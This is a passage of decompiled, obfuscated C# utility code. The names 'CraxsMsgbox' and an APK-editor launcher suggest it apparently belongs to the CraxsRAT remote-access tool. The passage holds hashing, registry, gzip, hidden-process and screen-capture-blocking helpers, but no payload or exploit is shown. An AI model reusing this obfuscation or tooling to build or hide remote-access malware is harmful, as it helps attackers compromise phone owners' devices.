            activityNames = stringList;
            num16 = (int) num17 * 683226250 ^ 395693104;
            continue;
          case 3:
            goto label_42;
          case 4:
            num16 = (int) num17 * -301723944 ^ 1994746499;
            continue;
          default:
            goto label_43;
        }
      }
label_42:
      int num18 = (int) Interaction.MsgBox((object) EXGuarder.\u00361623D38);
      activityNames = (List<string>) null;
      num16 = 1096791347;
      goto label_39;
label_43:
      return activityNames;
    }

    public static object ComputeHash(byte[] array)
    {
      string str = EXGuarder.\u0031B30122B;
      int num1 = checked (array.Length - 1);
label_1:
      int num2 = 1845395544;
      int index;
      object lower;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~(-~num2 * 525085207)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            index = 0;
            num2 = (int) num3 * -1001957129 ^ -770513030;
            continue;
          case 3:
            int num4;
            num2 = num4 = index <= num1 ? -324392114 : (num4 = 1672258369);
            continue;
          case 4:
            str += array[index].ToString(EXGuarder.\u00367342520);
            checked { ++index; }
            num2 = 240739354;
            continue;
          case 5:
            lower = (object) str.ToLower();
            num2 = (int) num3 * -643046288 ^ -872329834;
            continue;
          case 6:
            num2 = (int) num3 * 1907666822 ^ -338470218;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return lower;
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    public static Image Base64ToImage(string base64string)
    {
      string s = base64string.Replace(EXGuarder.\u003272F0C1F, EXGuarder.\u003734D666C);
label_1:
      int num1 = -448423773;
      byte[] buffer;
      MemoryStream memoryStream;
      Image image;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~num1 ^ 873746313 * (-(334915879 - -14119034) + (864481522 - -1546134201 ^ -609671450 - 163493385))) + (~1063417426 + (1384926117 - 561406151) + 1230597510) ^ --637091391)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            memoryStream.Dispose();
            num1 = (int) num2 * -1508811953 ^ -1610940284;
            continue;
          case 3:
            buffer = Convert.FromBase64String(s);
            num1 = (int) num2 * -207280270 ^ 1243210193;
            continue;
          case 4:
            memoryStream = new MemoryStream(buffer);
            image = Image.FromStream((Stream) memoryStream);
            num1 = (int) num2 * -1864040020 ^ -1688731315;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return image;
    }

    public static string ProcessJson(string chromeJson)
    {
      return chromeJson.Replace(EXGuarder.\u0031057093E, EXGuarder.\u0030963080C).Replace(EXGuarder.\u0033A003D0A, EXGuarder.\u0030963080C).Replace(EXGuarder.\u003135F0375, EXGuarder.\u0030963080C).Replace(EXGuarder.\u0035B2D5600, EXGuarder.\u003006F4B22).Replace(EXGuarder.\u003480D333E, EXGuarder.\u0030931265F).Replace(EXGuarder.\u00311201C0F, EXGuarder.\u0030931265F);
    }

    public static object inializeReg()
    {
      RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
      string str = EXGuarder.\u0032305215C;
      RegistryKey registryKey2 = registryKey1.OpenSubKey(str, true);
      object obj;
      try
      {
        if (registryKey2 != null)
          goto label_5;
label_2:
        int num1 = 187754606;
label_3:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-~~num1) % 4U)
          {
            case 0:
              goto label_5;
            case 1:
              registryKey1.CreateSubKey(str);
              num1 = (int) num2 * 1548093565 ^ -541986864;
              continue;
            case 3:
              goto label_2;
            default:
              goto label_8;
          }
        }
label_5:
        obj = (object) true;
        num1 = 965832427;
        goto label_3;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      obj = (object) false;
label_8:
      return obj;
    }

    public static void GetKeyFromReg(string key)
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(EXGuarder.\u00375001413, true);
      registryKey.SetValue(EXGuarder.\u0036C04096A, (object) key);
      registryKey.Close();
    }

    public static string getuserkey()
    {
      string str;
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(EXGuarder.\u0031D295E52, true);
        try
        {
          if (RuntimeHelpers.GetObjectValue(registryKey.GetValue(EXGuarder.\u0030A584276)) != null)
          {
label_2:
            uint num;
            switch ((num = (uint) ((-(-375773761 - (~(-1558735365 - -1877075637) ^ (-1904069722 ^ -356795801 ^ -1299386213 * 439376051) * -1485906713 - (-324481713 * (1551214801 - 901012062) ^ -38548679 - 1690906954 + (-1682303608 - -1413089924)))) ^ -855387073 * (-1597540826 - -538965107 ^ 1886264709)) * -1757381157)) % 3U)
            {
              case 0:
                goto label_2;
              case 1:
                str = registryKey.GetValue(EXGuarder.\u0030A584276).ToString();
                goto label_11;
            }
          }
        }
        finally
        {
          if (registryKey != null)
          {
label_5:
            int num1 = 805083498;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) ((-(num1 - (~(-1558735365 - -1877075637) ^ (-1904069722 ^ -356795801 ^ -1299386213 * 439376051) * -1485906713 - (-324481713 * (1551214801 - 901012062) ^ -38548679 - 1690906954 + (-1682303608 - -1413089924)))) ^ -855387073 * (-1597540826 - -538965107 ^ 1886264709)) * -1757381157)) % 3U)
              {
                case 0:
                  goto label_5;
                case 1:
                  ((IDisposable) registryKey).Dispose();
                  num1 = (int) num2 * -1686625511 ^ -1861613609;
                  continue;
                default:
                  goto label_8;
              }
            }
          }
label_8:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      str = EXGuarder.\u0036431412A;
label_11:
      return str;
    }

    public static System.Text.Encoding Encoding() => System.Text.Encoding.UTF8;

    public static Image ChangeImageOpacity(Bitmap originalImage)
    {
      float num1 = 50f;
      float gamma = 1f;
label_1:
      int num2 = -1205763194;
      float num3;
      float[][] newColorMatrix;
      Graphics graphics;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (-(-num2 ^ --1746754336 - ~(-1133676141 - -2127354969) ^ -1487736551 * 289337337) - (223026392 + 799592716 ^ -1936763021 ^ 891298392) - 1960405443 * 562193271)) % 8U)
        {
          case 0:
            goto label_1;
          case 2:
            newColorMatrix = new float[5][]
            {
              new float[5]{ num1, 0.0f, 0.0f, 0.0f, 0.0f },
              new float[5]{ 0.0f, num1, 0.0f, 0.0f, 0.0f },
              new float[5]{ 0.0f, 0.0f, num1, 0.0f, 0.0f },
              new float[5]{ 0.0f, 0.0f, 0.0f, 1f, 0.0f },
              new float[5]{ num3, num3, num3, 0.0f, 1f }
            };
            Codes.imageAttributes.ClearColorMatrix();
            num2 = (int) num4 * 1276135219 ^ -1760771775;
            continue;
          case 3:
            graphics = Graphics.FromImage((Image) originalImage);
            num2 = (int) num4 * -1357064286 ^ -343991750;
            continue;
          case 4:
            graphics.DrawImage((Image) originalImage, new Rectangle(0, 0, originalImage.Width, originalImage.Height), 0, 0, originalImage.Width, originalImage.Height, GraphicsUnit.Pixel, Codes.imageAttributes);
            num2 = (int) num4 * -1177215432 ^ -479942479;
            continue;
          case 5:
            Codes.imageAttributes.SetGamma(gamma, ColorAdjustType.Bitmap);
            num2 = (int) num4 * 1445507192 ^ 889108419;
            continue;
          case 6:
            num3 = 0.0f;
            num2 = (int) num4 * -1564170050 ^ -1266991410;
            continue;
          case 7:
            Codes.imageAttributes.SetColorMatrix(new ColorMatrix(newColorMatrix), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
            num2 = (int) num4 * 1760010486 ^ -1404393801;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return (Image) originalImage;
    }

    public static string GenerateRandomFolderName(string nam)
    {
      // ISSUE: variable of a compiler-generated type
      Codes._Closure\u0024__43\u002D0 closure430_1;
      // ISSUE: variable of a compiler-generated type
      Codes._Closure\u0024__43\u002D0 closure430_2 = (Codes._Closure\u0024__43\u002D0) new Codes(closure430_1);
label_1:
      int num1 = 1147666693;
      string randomFolderName;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string tempPath;
        string element;
        string driv;
        int count;
        string path2;
        string path;
        switch ((num3 = (uint) ((-445831580 ^ 1792900050) - (617427323 ^ 1813248091) - ((num2 - ~(-(55236847 * -1422464611) ^ -(-1438951565 - 1185916907) - 154175139) ^ ~~377159836) - ((1844928175 - 1747275123 ^ 1899878408 - 1022664726) + -1924494085 * --1179895533)) ^ 1703690955 - 2055513110 ^ -1241710270)) % 11U)
        {
          case 0:
            path2 = EXGuarder.\u00332667035 + nam + EXGuarder.\u003223A3A55 + new string(Enumerable.Select<string, char>(Enumerable.Repeat<string>(element, 10), new Func<string, char>(((Codes) closure430_2)._Lambda\u0024__0)).ToArray<char>());
            num1 = (int) num3 * -1409898376 ^ 1757507808;
            continue;
          case 1:
            tempPath = Path.GetTempPath();
            element = EXGuarder.\u00356350379;
            num1 = (int) num3 * -130615123 ^ -33321078;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated method
            path2 = driv + EXGuarder.\u00332667035 + nam + EXGuarder.\u003223A3A55 + new string(Enumerable.Select<string, char>(Enumerable.Repeat<string>(element, count), new Func<string, char>(closure430_2._Lambda\u0024__1)).ToArray<char>());
            path = Path.Combine(tempPath, path2);
            num1 = -522435523;
            continue;
          case 3:
            int num4;
            num1 = num4 = Directory.Exists(path) ? 245047548 : (num4 = 479210502);
            continue;
          case 4:
            Directory.CreateDirectory(path);
            randomFolderName = path;
            num1 = (int) num3 * -957656505 ^ 473314617;
            continue;
          case 6:
            count = 10;
            ((infoServer) closure430_2).\u0024VB\u0024Local_random = new Random();
            num1 = (int) num3 * 236514019 ^ -1230518413;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = (int) num3 * -1849406252 ^ -1325488815;
            continue;
          case 9:
            driv = Codes.GetDriv();
            num1 = (int) num3 * 1597646600 ^ -1461464770;
            continue;
          case 10:
            path = Path.Combine(tempPath, path2);
            num1 = (int) num3 * -1398551786 ^ -1664671651;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return randomFolderName;
    }

    public static void DirectoryDeleteLong(string directoryPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath() + EXGuarder.\u0035F597235 + Guid.NewGuid().ToString());
      try
      {
        directoryInfo.Create();
        Process process = new Process();
        try
        {
          process.StartInfo.FileName = EXGuarder.\u00355311D05;
          process.StartInfo.Arguments = EXGuarder.\u00331354E42 + directoryInfo.FullName + EXGuarder.\u0036B0A3459 + directoryPath + EXGuarder.\u00324361A52;
label_3:
          int num1 = 878907396;
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) (((-1320050609 ^ 234877981) - -num2) * 1871237987)) % 5U)
            {
              case 0:
                process.Start();
                num1 = (int) num3 * 1319828683 ^ 1953487121;
                continue;
              case 1:
                process.WaitForExit();
                num1 = (int) num3 * 566700075 ^ -513416191;
                continue;
              case 2:
                goto label_3;
              case 3:
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                num1 = (int) num3 * -1567833647 ^ 1910192262;
                continue;
              default:
                goto label_14;
            }
          }
        }
        finally
        {
          if (process != null)
          {
label_9:
            int num4 = 1927151960;
            while (true)
            {
              int num5 = num4;
              uint num6;
              switch ((num6 = (uint) (((-1320050609 ^ 234877981) - -num5) * 1871237987)) % 3U)
              {
                case 0:
                  goto label_9;
                case 1:
                  process.Dispose();
                  num4 = (int) num6 * 311016775 ^ -956645783;
                  continue;
                default:
                  goto label_13;
              }
            }
          }
label_13:;
        }
label_14:
        directoryInfo.Delete();
label_15:
        int num7 = 353063856;
        while (true)
        {
          int num8 = num7;
          uint num9;
          switch ((num9 = (uint) (((-1320050609 ^ 234877981) - -num8) * 1871237987)) % 4U)
          {
            case 0:
              goto label_15;
            case 1:
              goto label_17;
            case 2:
              int num10 = !Directory.Exists(directoryPath) ? -889154063 : (num10 = 1373618927);
              num7 = num10 ^ (int) num9 * -419806964;
              continue;
            case 3:
              new DirectoryInfo(directoryPath).Attributes = FileAttributes.Normal;
              Directory.Delete(directoryPath);
              num7 = (int) num9 * 1224760906 ^ 2096584983;
              continue;
            default:
              goto label_11;
          }
        }
label_17:
        return;
label_11:;
      }
      catch (IOException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32.dll")]
    public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

    public static string GetSpeed(string speed)
    {
      int num = checked ((int) Math.Round(unchecked ((double) checked (Conversions.ToInteger(speed) * 3600) / 1000.0)));
      return string.Format(EXGuarder.\u00367553D3E, (object) num);
    }

    public static string Duration(int Time)
    {
      int Expression1 = Time % 60;
label_1:
      int num1 = 1938269995;
      int Expression2;
      int Expression3;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(-~(num1 ^ --((684030629 - 834783537) * -1973632415) * -104343215) + -(1174614154 ^ -518320629)) - 1826541436)) % 5U)
        {
          case 0:
            Expression3 = checked ((int) Math.Round(unchecked ((double) checked (Time - Expression1 + Expression2 * 60) / 3600.0 % 60.0)));
            num1 = (int) num2 * 841458866 ^ 1194998770;
            continue;
          case 1:
            str = Strings.Format((object) Expression3, EXGuarder.\u003683C7620) + EXGuarder.\u003792D2F68 + Strings.Format((object) Expression2, EXGuarder.\u003683C7620) + EXGuarder.\u003792D2F68 + Strings.Format((object) Expression1, EXGuarder.\u003683C7620).ToString();
            num1 = (int) num2 * -2058875239 ^ 642250535;
            continue;
          case 2:
            goto label_1;
          case 4:
            Expression2 = checked ((int) Math.Round(unchecked ((double) checked (Time - Expression1) / 60.0 % 60.0)));
            num1 = (int) num2 * -493696943 ^ 1713320590;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return str;
    }

    public static string ToTime(long Value)
    {
      long num1 = Value;
label_1:
      int num2 = -1071285982;
      long num3;
      long num4;
      while (true)
      {
        uint num5;
        switch ((num5 = (uint) ~(num2 - (~(-484099669 * (-1513131675 ^ --493876653)) ^ 1716311977 - -933524189 + (2097429367 + 1479015273) + (~-1974121798 - --1488513235) - (~~-999911071 + ~~1915124288)) ^ -(((1580187054 ^ 1013416138) + --120825433) * 673517841))) % 3U)
        {
          case 1:
            num3 = num1 / 3600L;
            num4 = checked (num1 - num3 * 3600L) / 60L;
            checked { num1 -= num3 * 3600L + num4 * 60L; }
            num2 = (int) num5 * -1916023842 ^ 419644855;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return string.Format(EXGuarder.\u003725C4272, (object) Conversions.ToString(num3), (object) Conversions.ToString(num4), (object) Conversions.ToString(num1));
    }

    public static byte[] CGzip(byte[] b)
    {
      byte[] numArray;
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        try
        {
          if (memoryStream.CanSeek)
          {
label_2:
            int num1 = -1018747858;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) ((num1 ^ (1355248616 - 557030265) * -930442903 + -(1109924958 * 1668739875) ^ 78533361 ^ ~-(305589397 - -820808085) + (143600739 ^ -1387590073 * 1956830809 ^ ~-1509517875)) * -336270765 - (-1655680277 + 1259925277 * ~-891821581))) % 3U)
              {
                case 0:
                  goto label_2;
                case 1:
                  memoryStream.Seek(0L, SeekOrigin.Begin);
                  num1 = (int) num2 * -866143990 ^ -1224490578;
                  continue;
                default:
                  goto label_5;
              }
            }
          }
label_5:
          GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Compress, true);
          try
          {
            gzipStream.Write(b, 0, b.Length);
          }
          finally
          {
            if (gzipStream != null)
            {
label_8:
              int num3 = -646133297;
              while (true)
              {
                uint num4;
                switch ((num4 = (uint) ((num3 ^ (1355248616 - 557030265) * -930442903 + -(1109924958 * 1668739875) ^ 78533361 ^ ~-(305589397 - -820808085) + (143600739 ^ -1387590073 * 1956830809 ^ ~-1509517875)) * -336270765 - (-1655680277 + 1259925277 * ~-891821581))) % 3U)
                {
                  case 1:
                    gzipStream.Dispose();
                    num3 = (int) num4 * -6287964 ^ -338207088;
                    continue;
                  case 2:
                    goto label_8;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
          numArray = memoryStream.ToArray();
        }
        finally
        {
          if (memoryStream != null)
          {
label_14:
            int num5 = -1005351320;
            while (true)
            {
              uint num6;
              switch ((num6 = (uint) ((num5 ^ (1355248616 - 557030265) * -930442903 + -(1109924958 * 1668739875) ^ 78533361 ^ ~-(305589397 - -820808085) + (143600739 ^ -1387590073 * 1956830809 ^ ~-1509517875)) * -336270765 - (-1655680277 + 1259925277 * ~-891821581))) % 3U)
              {
                case 1:
                  memoryStream.Dispose();
                  num5 = (int) num6 * 1445031992 ^ 150829922;
                  continue;
                case 2:
                  goto label_14;
                default:
                  goto label_17;
              }
            }
          }
label_17:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_19:
        int num7 = 911327227;
        while (true)
        {
          uint num8;
          switch ((num8 = (uint) ((num7 ^ (1355248616 - 557030265) * -930442903 + -(1109924958 * 1668739875) ^ 78533361 ^ ~-(305589397 - -820808085) + (143600739 ^ -1387590073 * 1956830809 ^ ~-1509517875)) * -336270765 - (-1655680277 + 1259925277 * ~-891821581))) % 4U)
          {
            case 0:
              goto label_19;
            case 1:
              numArray = (byte[]) null;
              num7 = (int) num8 * 1384299311 ^ -150236946;
              continue;
            case 3:
              ProjectData.ClearProjectError();
              num7 = (int) num8 * 1631839947 ^ 677931073;
              continue;
            default:
              goto label_23;
          }
        }
      }
label_23:
      return numArray;
    }

    private static bool IsCompressedGZip(byte[] data)
    {
      if (data.Length >= 2)
        goto label_6;
label_1:
      int num1 = 1147064635;
label_2:
      bool flag;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((1149953821 - 1204076207 - ~-260791349 ^ 620829199 * (-342122149 - -642347513)) - (num2 ^ 2000487905 * (--798721527 * 892705915) * -1309796469 ^ 625404465 - (~~1236496775 + (~21403458 ^ -797464204))) * 1267241897)) % 5U)
        {
          case 0:
            goto label_1;
          case 2:
            goto label_3;
          case 3:
            flag = false;
            num1 = (int) num3 * -1023013526 ^ 1217543022;
            continue;
          case 4:
            goto label_6;
          default:
            goto label_9;
        }
      }
label_3:
      int num4 = data[1] == (byte) 139 ? 1 : 0;
      goto label_5;
label_9:
      return flag;
label_5:
      flag = num4 != 0;
      num1 = -1062137356;
      goto label_2;
label_6:
      if (data[0] != (byte) 31)
      {
        num4 = 0;
        goto label_5;
      }
      else
      {
        num1 = -255704251;
        goto label_2;
      }
    }

    public static byte[] DEgzip(ref byte[] b)
    {
      byte[] numArray;
      try
      {
        if (Codes.IsCompressedGZip(b))
        {
          MemoryStream output = new MemoryStream();
          try
          {
            MemoryStream memoryStream = new MemoryStream(b);
            try
            {
              if (memoryStream.CanSeek)
              {
label_4:
                int num1 = 1693390989;
                while (true)
                {
                  uint num2;
                  switch ((num2 = (uint) ((num1 + ~~(-(1638424107 * 2090978814) ^ 1353164397) ^ ~-470962319 + (1322018073 * (-680583441 - 130041282) + --195750446)) * -821309631 - (1986485520 ^ -1946030176 - -852468253) - ~-2120556568 - -1303958875)) % 3U)
                  {
                    case 1:
                      memoryStream.Seek(0L, SeekOrigin.Begin);
                      num1 = (int) num2 * -473815066 ^ 1656371652;
                      continue;
                    case 2:
                      goto label_4;
                    default:
                      goto label_7;
                  }
                }
              }
label_7:
              GZipStream input = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
              try
              {
                Codes.CopyStreamToStream((Stream) input, (Stream) output);
              }
              finally
              {
                if (input != null)
                {
label_10:
                  int num3 = 1013109273;
                  while (true)
                  {
                    uint num4;
                    switch ((num4 = (uint) ((num3 + ~~(-(1638424107 * 2090978814) ^ 1353164397) ^ ~-470962319 + (1322018073 * (-680583441 - 130041282) + --195750446)) * -821309631 - (1986485520 ^ -1946030176 - -852468253) - ~-2120556568 - -1303958875)) % 3U)
                    {
                      case 0:
                        goto label_10;
                      case 1:
                        input.Dispose();
                        num3 = (int) num4 * -1891134535 ^ 760094726;
                        continue;
                      default:
                        goto label_13;
                    }
                  }
                }
label_13:;
              }
              numArray = output.ToArray();
              goto label_28;
            }
            finally
            {
              if (memoryStream != null)
              {
label_16:
                int num5 = -191091130;
                while (true)
                {
                  uint num6;
                  switch ((num6 = (uint) ((num5 + ~~(-(1638424107 * 2090978814) ^ 1353164397) ^ ~-470962319 + (1322018073 * (-680583441 - 130041282) + --195750446)) * -821309631 - (1986485520 ^ -1946030176 - -852468253) - ~-2120556568 - -1303958875)) % 3U)
                  {
                    case 1:
                      memoryStream.Dispose();
                      num5 = (int) num6 * 686018795 ^ 1601403149;
                      continue;
                    case 2:
                      goto label_16;
                    default:
                      goto label_19;
                  }
                }
              }
label_19:;
            }
          }
          finally
          {
            if (output != null)
            {
label_21:
              int num7 = 553374760;
              while (true)
              {
                uint num8;
                switch ((num8 = (uint) ((num7 + ~~(-(1638424107 * 2090978814) ^ 1353164397) ^ ~-470962319 + (1322018073 * (-680583441 - 130041282) + --195750446)) * -821309631 - (1986485520 ^ -1946030176 - -852468253) - ~-2120556568 - -1303958875)) % 3U)
                {
                  case 1:
                    output.Dispose();
                    num7 = (int) num8 * -1477917361 ^ 1507992531;
                    continue;
                  case 2:
                    goto label_21;
                  default:
                    goto label_24;
                }
              }
            }
label_24:;
          }
        }
        else
        {
          numArray = (byte[]) null;
          goto label_28;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      numArray = (byte[]) null;
label_28:
      return numArray;
    }

    public static void CopyStreamToStream(Stream input, Stream output)
    {
      try
      {
        byte[] buffer = new byte[16384];
label_1:
        int num1 = -921077665;
        while (true)
        {
          int num2 = num1;
          uint num3;
          int count;
          switch ((num3 = (uint) (781079772 - (915955949 + 287505769 + ~-694138741) - ((-~(-78001167 - -2100122596) ^ ~(-1443624935 - 511202563 - -401085932 * -1991130865)) - ~num2) - ~(283714705 ^ 177374818))) % 5U)
          {
            case 0:
              output.Write(buffer, 0, count);
              num1 = (int) num3 * -314768576 ^ 1499204686;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              count = input.Read(buffer, 0, buffer.Length);
              num1 = -77317177;
              continue;
            case 4:
              int num4 = count != 0 ? 747502791 : (num4 = -78032603);
              num1 = num4 ^ (int) num3 * -1626157442;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static T InlineAssignHelper<T>(ref T target, T value)
    {
      target = value;
label_1:
      int num1 = -1274005137;
      T obj;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(-num1 - (-1148676200 - ~1139491886 + -(1789751117 * -2119911429) ^ -1468615560 - 1721015403 - (400610711 - 277501696) + (292266059 + (1440133153 - 326221883))) ^ 1170294249 - 1163726716 + -438100124 * -1420341383 + 748805019 * (178915373 - 504663809))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            obj = value;
            num1 = (int) num2 * -1650558801 ^ 497640523;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return obj;
    }

    public static object BSEN(string Str)
    {
      return (object) Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Str));
    }

    public static Image BlankImage()
    {
      Image image;
      try
      {
        Bitmap bitmap = new Bitmap(1, 1);
        bitmap.SetPixel(0, 0, System.Drawing.Color.Transparent);
label_1:
        int num1 = -1345139539;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(-num1 - (-(-1601931935 - 1299683673) - (-1004885264 - -2030213288 + (2118797564 - 2079646654)) ^ 1917593450 ^ ~(1097995650 + 109987278))) ^ 1009978312)) % 3U)
          {
            case 1:
              image = (Image) bitmap;
              num1 = (int) num2 * 1795658223 ^ -2031576884;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_9;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_5:
        int num3 = -2099843690;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(-num3 - (-(-1601931935 - 1299683673) - (-1004885264 - -2030213288 + (2118797564 - 2079646654)) ^ 1917593450 ^ ~(1097995650 + 109987278))) ^ 1009978312)) % 4U)
          {
            case 0:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -1789563839 ^ -1367949476;
              continue;
            case 1:
              image = (Image) null;
              num3 = (int) num4 * -2105933206 ^ 791324123;
              continue;
            case 2:
              goto label_5;
            default:
              goto label_9;
          }
        }
      }
label_9:
      return image;
    }

    public static string Translate(string inputtext, string fromlangid, string tolangid)
    {
      string str;
      try
      {
        inputtext = HttpUtility.HtmlAttributeEncode(inputtext.Replace(EXGuarder.\u00366732E0E, EXGuarder.\u00301226B21));
label_1:
        int num1 = -1613718815;
        WebClient webClient;
        string json;
        JObject jobject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~num1 + --(--1412045960 ^ -566243398 - 1383936815)) - -1259601132 - (191450709 - 1216366121) + 499334833)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              webClient = new WebClient();
              webClient.Encoding = System.Text.Encoding.UTF8;
              num1 = (int) num2 * -625143942 ^ -1723548846;
              continue;
            case 2:
              str = jobject.SelectToken(EXGuarder.\u00345112D3F).SelectToken(EXGuarder.\u00374536908).ToString().Replace(EXGuarder.\u00301226B21, EXGuarder.\u00366732E0E);
              num1 = (int) num2 * -1104149390 ^ -1719595435;
              continue;
            case 3:
              jobject = JObject.Parse(json);
              num1 = (int) num2 * -1424132387 ^ -1586294095;
              continue;
            case 4:
              json = webClient.DownloadString(EXGuarder.\u003290A3613 + tolangid + EXGuarder.\u0032042724D + fromlangid + EXGuarder.\u00371617256 + inputtext);
              num1 = (int) num2 * -1514892911 ^ -1618706225;
              continue;
            default:
              goto label_12;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_8:
        int num3 = -1210113003;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~(~num3 + --(--1412045960 ^ -566243398 - 1383936815)) - -1259601132 - (191450709 - 1216366121) + 499334833)) % 4U)
          {
            case 0:
              goto label_8;
            case 1:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -1929255226 ^ 235237430;
              continue;
            case 3:
              str = inputtext.Replace(EXGuarder.\u00301226B21, EXGuarder.\u00366732E0E);
              num3 = (int) num4 * -1217760608 ^ 232376183;
              continue;
            default:
              goto label_12;
          }
        }
      }
label_12:
      return str;
    }

    public static bool MyMsgBox(string title, string msg, bool useno, Bitmap ico)
    {
      bool flag;
      try
      {
        string str = msg;
label_1:
        int num1 = 871698745;
        string language;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~((num1 - ~~(~-599983603 ^ ~(1293317095 ^ -1603005947)) ^ (-(1732121256 - 657954799) ^ -1912980495 - 994308052) + -(577327963 * (118455398 + 360358769)) ^ -(-1767991327 ^ -98035032 ^ -1195378101 ^ -939634929)) * 1313835887)) % 9U)
          {
            case 0:
              str = Codes.Translate(str, EXGuarder.\u00366222828, EXGuarder.\u00302435D3C);
              num1 = (int) num2 * 1529701645 ^ -666744524;
              continue;
            case 1:
              goto label_3;
            case 3:
              num1 = (int) num2 * -1400327609 ^ 1567201232;
              continue;
            case 4:
              int num3;
              num1 = num3 = new CraxsMsgbox(title.Replace(EXGuarder.\u0030C453D2F, EXGuarder.\u0030148515F), str, useno, ico).ShowDialog() != DialogResult.Yes ? -1939662623 : (num3 = -1832832573);
              continue;
            case 5:
              str = Codes.Translate(str, EXGuarder.\u00366222828, EXGuarder.\u00342361652);
              num1 = 278643704;
              continue;
            case 6:
              goto label_1;
            case 7:
              int num4 = Operators.CompareString(language, EXGuarder.\u0031C041A1C, false) != 0 ? 841263709 : (num4 = -840862095);
              num1 = num4 ^ (int) num2 * 2043671721;
              continue;
            case 8:
              language = RegistryHandler.Get_Language();
              int num5 = Operators.CompareString(language, EXGuarder.\u003415D0B06, false) == 0 ? 1020402910 : (num5 = 221377004);
              num1 = num5 ^ (int) num2 * -59397612;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        flag = true;
        goto label_15;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_11:
        int num6 = 939415609;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) ~~((num6 - ~~(~-599983603 ^ ~(1293317095 ^ -1603005947)) ^ (-(1732121256 - 657954799) ^ -1912980495 - 994308052) + -(577327963 * (118455398 + 360358769)) ^ -(-1767991327 ^ -98035032 ^ -1195378101 ^ -939634929)) * 1313835887)) % 3U)
          {
            case 0:
              goto label_11;
            case 1:
              ProjectData.ClearProjectError();
              num6 = (int) num7 * 772442514 ^ 142834544;
              continue;
            default:
              goto label_14;
          }
        }
      }
label_14:
      flag = false;
label_15:
      return flag;
    }

    public static string Excuteapkeditor_pro(string apkpath)
    {
      string path = Settings.res_Path + EXGuarder.\u00378170E46;
      if (System.IO.File.Exists(Settings.res_Path + EXGuarder.\u0036441705B ?? EXGuarder.\u00377484D0F))
        goto label_7;
label_1:
      int num1 = 1193486850;
label_2:
      Process process;
      string end;
      ProcessStartInfo startInfo;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 * 1844899391 - ~((~1415494854 ^ 101746231 - 104999153) * -2070402699) ^ ~(-869655445 * -470410943) ^ 1682357787) ^ 371324078 ^ 1147737125)) % 8U)
        {
          case 0:
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(startInfo);
